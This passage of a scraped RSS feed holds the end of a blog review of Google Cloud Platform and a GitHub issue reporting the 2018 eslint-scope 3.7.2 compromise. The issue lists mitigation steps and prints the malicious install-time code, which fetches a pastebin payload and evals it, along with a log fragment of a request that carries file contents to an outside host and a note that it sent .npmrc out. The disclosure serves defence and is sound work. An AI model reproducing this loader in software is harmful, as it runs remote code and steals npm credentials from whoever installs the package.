&lt;p&gt;Cloudbuild has a shared, free, pool of n1-standard1 instances that are kept running and are available to start running builds straight away. They also &lt;a href=&quot;https://cloud.google.com/container-builder/docs/speeding-up-builds#using_custom_virtual_machine_sizes&quot;&gt;offer&lt;/a&gt; high-CPU VMs that you can pay to use, but they only boot up when your build starts. I tried out the high-CPU instances to run faster builds, but including the instance boot time, test time was a wash, so I stayed on the n1-standard1’s.&lt;/p&gt;
&lt;h2 id=&quot;billing&quot;&gt;Billing&lt;/h2&gt;
&lt;p&gt;In an earlier draft Billing was in the Bad section, but GCP recently released reports for billing. These are more limited than what AWS offers, but get me the information I was after. They also offer &lt;a href=&quot;https://cloud.google.com/billing/docs/how-to/visualize-data&quot;&gt;billing integration&lt;/a&gt; with Data Studio if you want to drill in deeper. AWS built-in dashboard is still the winner here, with a lot more flexibility and pre-built reports.&lt;/p&gt;
&lt;p&gt;There is no way to set billing alerts for estimated usage, only actual usage. So if you want to keep track of your spend throughout the month and find out early if something is going rogue, you end up setting up 25%, 50%, 75% budget alerts. When you receive them, you then check how far through the month you are. In the last few days they have &lt;a href=&quot;https://cloudplatform.googleblog.com/2018/07/predict-your-future-costs-with-google-cloud-billing-cost-forecast.html&quot;&gt;released billing forecasts&lt;/a&gt;, so hopefully billing alerts will be able to be based on forecasted spend, not just actual spend.&lt;/p&gt;

&lt;h2 id=&quot;documentation&quot;&gt;Documentation&lt;/h2&gt;
&lt;p&gt;While GCP services exhibit strong consistency, I can’t always say the same thing for the documentation. You can sometimes see two pages disagree, e.g. HTTP/2 server push is both supported and not supported:&lt;/p&gt;
&lt;blockquote readability=&quot;9.748275862069&quot;&gt;
&lt;p&gt;The load balancer acts as an HTTP/2 to HTTP/1.1 translation layer, which means that the web servers always see and respond to HTTP/1.1 requests, but that requests from the browser can be HTTP/1.0, HTTP/1.1, or HTTP/2. &lt;strong&gt;HTTP/2 server push is not supported&lt;/strong&gt;. - &lt;a href=&quot;https://cloud.google.com/load-balancing/docs/https/setting-up-https&quot;&gt;Setting up HTTP(S) Load Balancing&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;and&lt;/p&gt;
&lt;blockquote readability=&quot;6.8387096774194&quot;&gt;
&lt;p&gt;&lt;code&gt;http2_server_push_canceled_invalid_response_code&lt;/code&gt; The load balancer canceled &lt;strong&gt;the HTTP/2 server push&lt;/strong&gt; because the backend returned an invalid response code. &lt;strong&gt;Can only happen when using http2 to the backend&lt;/strong&gt;. Client will receive a RST_STREAM containing INTERNAL_ERROR. - &lt;a href=&quot;https://cloud.google.com/load-balancing/docs/https/https-logging-monitoring&quot;&gt;HTTP(S) Load Balancing Logging and Monitoring&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The documentation will sometimes make assertions or tell you not to exceed certain limits, without telling you why, or what will happen if you go over the limit. An example of this is the Spanner &lt;a href=&quot;https://cloud.google.com/spanner/docs/schema-and-data-model#database-splits&quot;&gt;split size&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;As a rule of thumb, the size of every set of related rows in a hierarchy of parent-child tables should be less than a few GiB.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;GCP docs sometimes miss information on the interactions between components, e.g. preemptible instances, autoscaling, rolling updates, and the HTTP load balancer. Sometimes the docs will give you one sentence, and leave you to figure out all of the implications. AWS docs can be overly verbose, but they are usually quite good at documenting integration with other features and services.&lt;/p&gt;
&lt;p&gt;Sometimes when browsing documentation for a service or API you will find that the old way is deprecated, but the new way that they recommend you use is still in beta or alpha (!).&lt;/p&gt;
&lt;p&gt;I have reported bugs/clarifications against AWS docs and got prompt feedback and even requests for clarification from AWS team members. This has never happened for my comments submitted against Google’s documentation.&lt;/p&gt;
&lt;h2 id=&quot;observability&quot;&gt;Observability&lt;/h2&gt;
&lt;p&gt;Observability is a little bit difficult with autoscaling and health checks. Some of the different kinds of health checks aren’t logged anywhere as far as I can tell. This situation seems to be improving though, recently &lt;a href=&quot;https://cloud.google.com/compute/docs/autoscaler/viewing-autoscaler-logs&quot;&gt;autoscaling log explanations&lt;/a&gt; were added. There is also no easy way to tie autoscaling logs into Slack notifications. If you want to do this, you’ll need to create a log export to PubSub which will trigger a Cloud Function (equivalent to an AWS Lambda).&lt;/p&gt;
&lt;p&gt;As far as I can tell, you can’t get notifications before Cloud SQL’s maintenance is run, it just runs. You can specify when the &lt;a href=&quot;https://cloud.google.com/sql/docs/postgres/instance-settings#maintenance-window-2ndgen&quot;&gt;maintenance window&lt;/a&gt; would run for that week if it were to run.&lt;/p&gt;
&lt;h2 id=&quot;client-libraries&quot;&gt;Client Libraries&lt;/h2&gt;
&lt;p&gt;I had a bit of trouble dealing with dependency conflicts between different Java client libraries. Each wanted a different version of a set of common dependencies. I’m sure there must be a good reason, but several libraries come with a dependency on &lt;code&gt;com.google.guava/guava-jdk5&lt;/code&gt; which you’ll want to exclude and instead use an up-to-date Guava version.&lt;/p&gt;
&lt;p&gt;The API libraries and tools are spread across several GitHub organisations including &lt;a href=&quot;https://github.com/GoogleCloudPlatform&quot;&gt;GoogleCloudPlatform&lt;/a&gt;, &lt;a href=&quot;https://github.com/Google&quot;&gt;Google&lt;/a&gt;, and possibly others, which can make it a little difficult sometimes to track down the definition of something.&lt;/p&gt;
&lt;p&gt;Stackdriver Trace has been a bit of a pain to work with. The Java SDK has never been very well documented, there are several different minimally documented API versions available. Most recently it seems like the recommended approach is instead to use &lt;a href=&quot;https://opencensus.io&quot;&gt;OpenCensus&lt;/a&gt; to instrument your code.&lt;/p&gt;
&lt;h2 id=&quot;stackdriver-agents&quot;&gt;Stackdriver agents&lt;/h2&gt;
&lt;p&gt;Stackdriver provides two agents to capture logs and metrics. Log capture is provided through a &lt;a href=&quot;https://www.fluentd.org&quot;&gt;fluentd&lt;/a&gt; plugin and metrics via &lt;a href=&quot;https://collectd.org/wiki/index.php/Main_Page&quot;&gt;collectd&lt;/a&gt;. When I tried running Deps on g1-small instances, I found unexplained high CPU spikes from collectd and missing logs one time. Since moving back to n1-standard1 instances I haven’t seen any of these issues.&lt;/p&gt;
&lt;h2 id=&quot;cloud-sql-proxy&quot;&gt;Cloud SQL proxy&lt;/h2&gt;
&lt;p&gt;Google Cloud SQL has &lt;a href=&quot;https://cloud.google.com/sql/docs/postgres/external-connection-methods&quot;&gt;many options&lt;/a&gt; to connect to a Postgres SQL instance, but not the one that you probably want - &lt;a href=&quot;https://issuetracker.google.com/issues/35904255&quot;&gt;access through your VPC&lt;/a&gt;. Instead, you will probably end up running the &lt;a href=&quot;https://cloud.google.com/sql/docs/postgres/sql-proxy&quot;&gt;Cloud SQL Proxy&lt;/a&gt; on your VM which opens a tunnel to your SQL instance.&lt;/p&gt;
&lt;p&gt;When using the Cloud Shell, it uses temporary IP whitelisting. However, I found that it took so long for the whitelisting to be applied (1-2 minutes) that I usually gave up and chose another method to connect.&lt;/p&gt;
&lt;h2 id=&quot;slow-pace&quot;&gt;Slow pace&lt;/h2&gt;
&lt;p&gt;The pace of improvements feels very slow compared to AWS. Announcements made last year have taken a long time to come out. For example, &lt;a href=&quot;https://cloudplatform.googleblog.com/2016/10/introducing-a-new-era-of-customer-support-Google-Customer-Reliability-Engineering.html&quot;&gt;Customer Reliability Engineering&lt;/a&gt; and a &lt;a href=&quot;https://cloudplatform.googleblog.com/2017/03/reimagining-support-for-Google-Cloud-Platform-new-pricing-model-and-partnerships.html&quot;&gt;new approach to support&lt;/a&gt; were announced in 2017, and their new support offering has only just become available. It just &lt;em&gt;feels&lt;/em&gt; like a much smaller operation than AWS. There’s no time to waste, AWS is accelerating, and it doesn’t feel like GCP is keeping up.&lt;/p&gt;
&lt;p&gt;Currently, GCP is missing parity with a lot of AWS services. While drafting this earlier in the year I noted that they were missing caching, WAF/DDoS protection and a low-latency key-value store (&lt;a href=&quot;https://cloud.google.com/bigtable/&quot;&gt;that doesn’t start at $700/month&lt;/a&gt;). However, since then, they have announced &lt;a href=&quot;https://cloud.google.com/memorystore/&quot;&gt;Cloud Memorystore for Redis&lt;/a&gt; and &lt;a href=&quot;https://cloud.google.com/armor/&quot;&gt;Cloud Armor&lt;/a&gt; for WAF/DDoS protection. I’m looking forward to seeing if anything else will be announced at Google Cloud Next in a few weeks.&lt;/p&gt;
&lt;h2 id=&quot;support&quot;&gt;Support&lt;/h2&gt;
&lt;p&gt;I paid for Silver support (the lowest paid tier) for a few months while I was working through some issues. Support was often not very helpful on the first interaction and didn’t really seem to understand the problem. I needed to be quite persistent to communicate what the problem was. I’m not sure if paying for higher tiers would have helped here?&lt;/p&gt;
&lt;h2 id=&quot;getting-booted-by-the-algorithm&quot;&gt;Getting Booted by The Algorithm&lt;/h2&gt;
&lt;p&gt;I haven’t experienced this myself, but I recently saw a &lt;a href=&quot;https://medium.com/@serverpunch/why-you-should-not-use-google-cloud-75ea2aec00de&quot;&gt;harrowing tale&lt;/a&gt; from a GCP customer who had their entire project shut down by Google’s fraud protection system, with full deletion scheduled for 3 business days later. It wasn’t clear how much the customer was at fault here, but this response seemed disproportionate. This isn’t the only time I’ve seen this kind of thing happen from Google.&lt;/p&gt;
&lt;p&gt;A Customer Engineer at Google Cloud &lt;a href=&quot;https://medium.com/@mkahnucf/i-highly-recommend-establishing-an-enterprise-relationship-with-google-cloud-e97f4ac5d69&quot;&gt;commented&lt;/a&gt; that if you were worried about this scenario that you set up an &lt;a href=&quot;https://cloud.google.com/billing/docs/how-to/invoiced-billing&quot;&gt;invoiced billing&lt;/a&gt; with Google Cloud. I was worried about this, so inquired about setting it up. The response I got back was:&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;Prior to applying for monthly invoicing, please review the following minimum requirements to determine if you are eligible to apply. These requirements include, but are not limited to:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Being registered as a business for a minimum of one year.&lt;/li&gt;
&lt;li&gt;Spending a minimum of $2,500 a month for the last 3 months.&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;p&gt;I’m not sure why they didn’t tell me the full list of requirements (“These requirements include, but are not limited to”), but I’m not spending $2.5k/month, so this wasn’t an option for me. Google does let you add a second credit card in case your primary one has a problem. I think I just have to keep my fingers crossed that I don’t run afoul of The Algorithm.&lt;/p&gt;
&lt;h2 id=&quot;secret-storage&quot;&gt;Secret Storage&lt;/h2&gt;
&lt;p&gt;I’m now using &lt;a href=&quot;https://www.envkey.com&quot;&gt;EnvKey&lt;/a&gt; (which is excellent by the way), but it would be nice to have an easy way to store and retrieve sensitive secrets built into GCP. There is a &lt;a href=&quot;https://cloud.google.com/kms/docs/store-secrets&quot;&gt;recipe&lt;/a&gt; for setting it up yourself with a bucket and encrypting the data with KMS, but it’s a bit of a pain, and it would be much nicer to just have an API to call which both stores &lt;em&gt;and&lt;/em&gt; encrypts the data, ala &lt;a href=&quot;https://aws.amazon.com/secrets-manager/&quot;&gt;AWS Secrets Manager&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;project-services&quot;&gt;Project Services&lt;/h2&gt;
&lt;p&gt;Google Cloud requires you to enable access to an API before you can use it. This can sometimes take a while. If you only use the Console to administer your resources, you’re unlikely to run into much trouble, as these APIs are enabled on first use. When using Terraform to rebuild testing environments, deleting and recreating these services turned out to be the longest pole in the tent. There is a new &lt;code&gt;disable_on_destroy = &quot;false&quot;&lt;/code&gt; option for the &lt;a href=&quot;https://www.terraform.io/docs/providers/google/r/google_project_services.html&quot;&gt;google_project_services&lt;/a&gt; Terraform resource which lets you keep the services around when destroying all resources, which is helpful. Occasionally I notice that Google has renamed or split an API service into multiple pieces. When I run Terraform, this step will fail because it wants to re-add an API which no longer exists.&lt;/p&gt;
&lt;p&gt;It would be easier if I didn’t need to think about this API access, but I assume that it is there for good reasons, probably involving capacity planning.&lt;/p&gt;
&lt;h2 id=&quot;acquisitions&quot;&gt;Acquisitions&lt;/h2&gt;
&lt;p&gt;While Google has done well at integrating core infrastructure, acquisitions have not gone so well. There should be a single console for all GCP resources. Instead, you have the Console, Stackdriver, Firebase, a separate Support portal, BigQuery, and &lt;a href=&quot;https://www.zyncrender.com&quot;&gt;Zync&lt;/a&gt;, all living in different places.&lt;/p&gt;

&lt;p&gt;I have only had two really bad experiences on Google Cloud Platform.&lt;/p&gt;
&lt;h2 id=&quot;stackdriver-monitoring&quot;&gt;Stackdriver Monitoring&lt;/h2&gt;
&lt;p&gt;Stackdriver Monitoring has been my biggest disappointment with Google Cloud Platform. It apparently reuses Google’s internal infrastructure, though I’m not sure which parts, and I doubt that it includes the front-end. I’ve had a number of issues using Stackdriver Monitoring:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;The minimum time you can set before a failing Uptime check becomes unhealthy is five minutes. It then takes an additional five minutes for that error notification to be sent via email or PagerDuty integration. This means that it will take ~ten minutes from the time a production service stops responding, to the time you are notified. Good luck maintaining your &lt;a href=&quot;https://landing.google.com/sre/book/chapters/service-level-objectives.html&quot;&gt;SLO’s&lt;/a&gt; with that kind of delay. Apparently this is &lt;a href=&quot;https://issuetracker.google.com/issues/77664368&quot;&gt;working&lt;/a&gt; as &lt;a href=&quot;https://cloud.google.com/monitoring/alerts/#notification-latency&quot;&gt;designed&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Uptime checks take around &lt;a href=&quot;https://cloud.google.com/monitoring/uptime-checks/management&quot;&gt;25 minutes&lt;/a&gt; to actually start checking after you define them. You can preview an uptime check result before starting it, but it is still frustrating to have to wait so long for the uptime checks to start firing. The only other service I’ve ever used that behaved like this was CloudFront, which also has extremely long update/creation times.&lt;/li&gt;
&lt;li&gt;The Stackdriver Monitoring console is separate from the rest of the Google Cloud Console and requires you to re-auth to enter it. The layout is a bit confusing, and not that intuitive to navigate. I sometimes got UI glitches when configuring things that required a page refresh.&lt;/li&gt;
&lt;li&gt;As best as I can tell, there is no way to access history for an instance once it is destroyed. This doesn’t work well with an autoscaling environment if you want to find out why an instance was destroyed, or what was going on when it was unhealthy.&lt;/li&gt;
&lt;li&gt;Charts aren’t labelled with units, which means it’s often unclear what is being measured, e.g. JVM GC count is “0.013”. I think that’s per second, but I’m not really sure.&lt;/li&gt;
&lt;li&gt;The &lt;a href=&quot;https://cloud.google.com/stackdriver/pricing&quot;&gt;previous pricing model&lt;/a&gt; was not very good. If you wanted Slack or Pagerduty integration you needed to pay for Stackdriver Premium. This cost $8/resource/month. They have just moved to a &lt;a href=&quot;https://cloud.google.com/stackdriver/pricing_v2&quot;&gt;new pricing model&lt;/a&gt; which is priced based on usage. This is a good move, as I was only paying the extra amount for Stackdriver Premium so I could get longer log retention and Slack notifications.&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;http-load-balancer&quot;&gt;HTTP Load Balancer&lt;/h2&gt;
&lt;p&gt;The HTTP Load Balancer sounds like a magical experience. You get a single IP address and your customer traffic will enter Google’s network at the closest location to them. Then it will transfer over Google’s premium dark fibre until it is routed to the closest region you are running in. This is a shared resource among all of Google’s customers and Google itself and doesn’t need to be warmed up.&lt;/p&gt;
&lt;p&gt;However, we had an extremely annoying issue where external traffic would get very occasional (0-3 daily) 502 errors returned by the load balancer without even contacting my instances. This is more of a problem for Deps than a standard web application, as if this 502 is served to a Maven client downloading dependencies, it will fail the entire download process.&lt;/p&gt;
&lt;p&gt;There is a field on the load balancer logs which says which backend caused the 502 failure, but this field is always blank. Not helpful. I tried contacting support about this. At first, they said that it was a problem at my end with misconfigured keepalive settings. Then they said that the small number of 502’s within an acceptable range (even when I had very low traffic volumes). Luckily I found other people had the same issue on Slack and the &lt;a href=&quot;https://groups.google.com/forum/#!topic/gce-discussion/7ETsl0YH1iQ&quot;&gt;GCE mailing list&lt;/a&gt;, so I knew I wasn’t going crazy.&lt;/p&gt;
&lt;p&gt;This was probably my most negative experience with GCP. Eventually, the 502 errors went away, but it was frustrating that it was never acknowledged.&lt;/p&gt;

&lt;p&gt;I can see a number of opportunities for Google Cloud to improve. Preemptible instances are a great model, I wish they were better suited for serving web traffic. AWS let you create a pool of spot and non-spot instances so that if your spot instances are outbid that your service doesn’t drop off the internet.&lt;/p&gt;
&lt;p&gt;I would love to see more of Google’s proprietary technology made available, particularly around operations and monitoring. Google has a strong brand in Site Reliability Engineering, but their tools are still weak to middling in this area. Another service that would be very handy is a hosted etcd/Zookeeper service for service discovery, consensus, leader election, and distributed cron jobs.&lt;/p&gt;
&lt;p&gt;Google has a very bad reputation around algorithmic actions shutting down or locking out customer accounts. This seems like an unforced error. They would do well to reverse this policy, make a statement about it, and put in place something a little more humane.&lt;/p&gt;
&lt;p&gt;Google has (fairly or unfairly) become notorious for shutting down services and APIs that are infrequently used. To the best of my knowledge AWS has never done this. Amazon SimpleDB is de-emphasised, but it’s still available for use if you want it. Making a public committment to not shut down APIs and services would help Google with developer and corporate mindshare.&lt;/p&gt;
&lt;p&gt;AWS has been &lt;a href=&quot;https://www.quora.com/Has-Amazon-contributed-to-the-open-source-community/answer/Guido-Bartolucci&quot;&gt;very&lt;/a&gt; &lt;a href=&quot;http://www.theregister.co.uk/2014/01/22/amazon_open_source_investigation/&quot;&gt;poor&lt;/a&gt; at contributing back to the open source projects that they use. I’ve been pleased to see Google open source a lot of their work lately, notably &lt;a href=&quot;https://kubernetes.io&quot;&gt;Kubernetes&lt;/a&gt;, as well as smaller projects like &lt;a href=&quot;https://github.com/google/gvisor&quot;&gt;gVisor&lt;/a&gt; and &lt;a href=&quot;https://cloudplatform.googleblog.com/2018/07/introducing-jib-build-java-docker-images-better.html&quot;&gt;Jib&lt;/a&gt;. More work contributing back to open source projects they run like Redis, Postgres, and MySQL would help them improve developer mindshare.&lt;/p&gt;

&lt;p&gt;Google Cloud has created a compelling offering, with a mix of rock-solid infrastructure, plus unique value-added products like Spanner, Pub/Sub, and Global Load Balancing. They’ve been able to learn from what AWS got right and wrong. Their products integrate well together and are simple to understand. The downside to Google’s more deliberate approach is that it can sometimes feel like AWS is not just ahead of GCP, but accelerating away. I’m hopeful that the upcoming &lt;a href=&quot;https://cloud.withgoogle.com/next18/sf/&quot;&gt;Google Cloud Next&lt;/a&gt; will bring more parity with AWS’ offerings.&lt;/p&gt;
&lt;p&gt;For companies that don’t want to spend a lot of time learning and dealing with the complexities of AWS, I recommend looking at Google Cloud. If I had to start all over again, I would still happily choose Google Cloud.&lt;/p&gt;
</description>
<pubDate>Thu, 12 Jul 2018 12:23:17 +0000</pubDate>
<dc:creator>dantiberian</dc:creator>
<og:title>Google Cloud Platform - The Good, Bad, and Ugly (It's Mostly Good)</og:title>
<og:type>article</og:type>
<og:url>https://www.deps.co/blog/google-cloud-platform-good-bad-ugly/</og:url>
<og:image>https://www.deps.co/img/default.png</og:image>
<og:description>Deps is a private, hosted, Maven repository. While building it I had a critical decision to make - Where to host it? I evaluated many different hosting services but decided on Google Cloud Platform (GCP). I’ve been using it in pre-production and then production for over a year and a half now. I haven’t seen too many experience reports on Google Cloud, so I wanted to share how I’ve found it, what went well, and what still needs improving.</og:description>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.deps.co/blog/google-cloud-platform-good-bad-ugly/</dc:identifier>
</item>
<item>
<title>ESLint compromised, may have stolen your credentials</title>
<link>https://github.com/eslint/eslint-scope/issues/39</link>
<guid isPermaLink="true" >https://github.com/eslint/eslint-scope/issues/39</guid>
<description>&lt;h2&gt;Update from the maintainers&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://status.npmjs.org/incidents/dn7c1fgrr7ng&quot; rel=&quot;nofollow&quot;&gt;Incident status report from npm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Please follow the comment by &lt;a class=&quot;user-mention&quot; data-hovercard-user-id=&quot;284282&quot; data-octo-click=&quot;hovercard-link-click&quot; data-octo-dimensions=&quot;link_type:self&quot; href=&quot;https://github.com/platinumazure&quot;&gt;@platinumazure&lt;/a&gt; that gives a little insight into what happened:&lt;br/&gt;&lt;a class=&quot;issue-link js-issue-link&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;340594914&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https://github.com/eslint/eslint-scope/issues/39&quot; href=&quot;https://github.com/eslint/eslint-scope/issues/39#issuecomment-404533026&quot;&gt;#39 (comment)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It also appears that the same code was published in eslint-config-eslint@5.0.2, which has also since been unpublished. See &lt;a class=&quot;issue-link js-issue-link&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;340687845&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https://github.com/eslint/eslint/issues/10600&quot; href=&quot;https://github.com/eslint/eslint/issues/10600&quot;&gt;eslint/eslint#10600&lt;/a&gt; for more information.&lt;/p&gt;
&lt;h2&gt;In the meantime&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;Pin the version of &lt;code&gt;eslint-scope&lt;/code&gt; to &lt;code&gt;3.7.1&lt;/code&gt;, one way is to add the &lt;code&gt;resolutions&lt;/code&gt; to your &lt;code&gt;package.json&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;pre&gt;
&lt;code&gt;  &quot;resolutions&quot;: {
    &quot;eslint-scope&quot;: &quot;3.7.1&quot;
  }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Verify the dependency version with &lt;code&gt;yarn list eslint-scope&lt;/code&gt;. It should print out &lt;code&gt;eslint-scope@3.7.1&lt;/code&gt;&lt;/p&gt;
&lt;ol start=&quot;2&quot; readability=&quot;1.3901673640167&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;Use &lt;code&gt;package-lock.json&lt;/code&gt; or &lt;code&gt;yarn.lock&lt;/code&gt; and have it in your repo if possible. Do not upgrade to 3.7.2 even if &lt;code&gt;yarn outdated&lt;/code&gt; shows that there is a new version available.&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2.6656050955414&quot;&gt;
&lt;p&gt;Revoke your NPM token as suggested in the comment below &lt;a class=&quot;issue-link js-issue-link&quot; data-error-text=&quot;Failed to load issue title&quot; data-id=&quot;340594914&quot; data-permission-text=&quot;Issue title is private&quot; data-url=&quot;https://github.com/eslint/eslint-scope/issues/39&quot; href=&quot;https://github.com/eslint/eslint-scope/issues/39#issuecomment-404496856&quot;&gt;#39 (comment)&lt;/a&gt;. You can do the same by logging in to &lt;a href=&quot;https://www.npmjs.com/&quot; rel=&quot;nofollow&quot;&gt;https://www.npmjs.com/&lt;/a&gt;, selecting the &quot;tokens&quot; menu from the account dropdown and removing all tokens listed on the page. Make sure to recreate the relevant tokens if you hook your NPM to external services.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2&gt;The issue&lt;/h2&gt;
&lt;p&gt;I don't know what the hell this is but it looks like a virus to me:&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[2/3] ⠠ eslint-scope
error /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope: Command failed.
Exit code: 1
Command: node ./lib/build.js
Arguments: 
Directory: /Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope
Output:
undefined:30
      https1.get({hostname:'sstatic1.histats.com',path:'/0.gif?4103075&amp;amp;101',method:'GET',headers:{Referer:'http://1.a/'+conten
                                                                                                                        ^^^^^^

SyntaxError: Unexpected end of input
    at IncomingMessage.r.on (/Users/pronebird/Desktop/electron-react-redux-boilerplate/node_modules/eslint-scope/lib/build.js:6:10)
    at emitOne (events.js:116:13)
    at IncomingMessage.emit (events.js:211:7)
    at IncomingMessage.Readable.read (_stream_readable.js:475:10)
    at flow (_stream_readable.js:846:34)
    at resume_ (_stream_readable.js:828:3)
    at _combinedTickCallback (internal/process/next_tick.js:138:11)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The contents of a suspicious file:&lt;/p&gt;
&lt;div class=&quot;highlight highlight-source-js&quot; readability=&quot;20&quot;&gt;
&lt;pre&gt;
&lt;span class=&quot;pl-k&quot;&gt;try&lt;/span&gt;{
    &lt;span class=&quot;pl-k&quot;&gt;var&lt;/span&gt; https&lt;span class=&quot;pl-k&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pl-c1&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;https&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
    &lt;span class=&quot;pl-smi&quot;&gt;https&lt;/span&gt;.&lt;span class=&quot;pl-c1&quot;&gt;get&lt;/span&gt;({&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;hostname&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;pastebin.com&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,path&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;/raw/XLeVP82h&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,headers&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt;{&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;User-Agent&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,Accept&lt;span class=&quot;pl-k&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;}},(&lt;span class=&quot;pl-smi&quot;&gt;r&lt;/span&gt;)&lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt;{
    &lt;span class=&quot;pl-smi&quot;&gt;r&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;setEncoding&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;utf8&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;);
    &lt;span class=&quot;pl-smi&quot;&gt;r&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;on&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;data&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,(&lt;span class=&quot;pl-smi&quot;&gt;c&lt;/span&gt;)&lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt;{
    &lt;span class=&quot;pl-c1&quot;&gt;eval&lt;/span&gt;(c);
    });
    &lt;span class=&quot;pl-smi&quot;&gt;r&lt;/span&gt;.&lt;span class=&quot;pl-en&quot;&gt;on&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;error&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,()&lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt;{});
    
    }).&lt;span class=&quot;pl-en&quot;&gt;on&lt;/span&gt;(&lt;span class=&quot;pl-s&quot;&gt;&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;error&lt;span class=&quot;pl-pds&quot;&gt;'&lt;/span&gt;&lt;/span&gt;,()&lt;span class=&quot;pl-k&quot;&gt;=&amp;gt;&lt;/span&gt;{});
    }&lt;span class=&quot;pl-k&quot;&gt;catch&lt;/span&gt;(e){}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The URL it attempts to load is &lt;a href=&quot;http://pastebin.com/raw/XLeVP82h&quot; rel=&quot;nofollow&quot;&gt;http://pastebin.com/raw/XLeVP82h&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Also it attempts to send my &lt;code&gt;.npmrc&lt;/code&gt; somewhere.&lt;/p&gt;
&lt;p&gt;This is version 3.7.2 that's been published an hour ago.&lt;/p&gt;
</description>
<pubDate>Thu, 12 Jul 2018 12:10:32 +0000</pubDate>
<dc:creator>maaaats</dc:creator>
<og:image>https://avatars3.githubusercontent.com/u/704044?s=400&amp;v=4</og:image>
<og:type>object</og:type>
<og:title>Virus in eslint-scope? · Issue #39 · eslint/eslint-scope</og:title>
<og:url>https://github.com/eslint/eslint-scope/issues/39</og:url>
<og:description>Updated blog post: https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes Update from the maintainers Incident status report from npm Please follow the comment by @platinumazure...</og:description>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://github.com/eslint/eslint-scope/issues/39</dc:identifier>
</item>
<item>
<title>A biologist who believes that trees speak a language we can learn to listen to</title>
